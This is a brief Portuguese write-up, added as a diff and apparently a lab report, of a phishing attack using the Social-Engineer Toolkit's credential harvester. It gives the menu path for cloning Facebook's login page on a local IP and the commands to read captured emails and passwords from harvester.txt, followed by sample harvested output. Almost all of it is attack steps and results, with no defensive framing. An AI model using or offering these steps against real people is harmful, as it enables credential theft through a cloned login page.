@@ -1,0 +1,48 @@
+Código Utilizado
+1. Iniciando o SEToolkit e Configurando o Ataque
+bash
+Copiar código
+# Acesso como root
+sudo su
+
+# Iniciar o SEToolkit
+setoolkit
+
+# Navegação no menu interativo:
+# 1) Social-Engineering Attacks
+# 2) Website Attack Vectors
+# 3) Credential Harvester Attack Method
+# 2) Site Cloner
+
+# Obter o IP da máquina
+ifconfig
+
+# Inserir o IP local (exemplo: 192.168.0.105) e a URL do clone:
+http://www.facebook.com
+2. Acessando Dados Coletados
+Os dados inseridos pelos usuários são armazenados no diretório padrão do servidor:
+
+bash
+Copiar código
+# Acesse o diretório onde os dados estão armazenados
+cd /var/www/html/
+
+# Visualize as credenciais capturadas
+cat harvester.txt
+Resultados
+Arquivo harvester.txt com Dados Coletados
+Exemplo de saída do arquivo:
+
+yaml
+Copiar código
+[+] CREDENTIAL HARVESTER RESULTS
+
+POSSIBLE USERNAME FIELD FOUND: email-joao@gmail.com
+POSSIBLE PASSWORD FIELD FOUND: pass=passwd123
+Demonstração Visual
+Exemplo de resultados no terminal:
+
+plaintext
+Copiar código
+POSSIBLE USERNAME FIELD FOUND: email-joao@gmail.com
+POSSIBLE PASSWORD FIELD FOUND: pass=passwd123
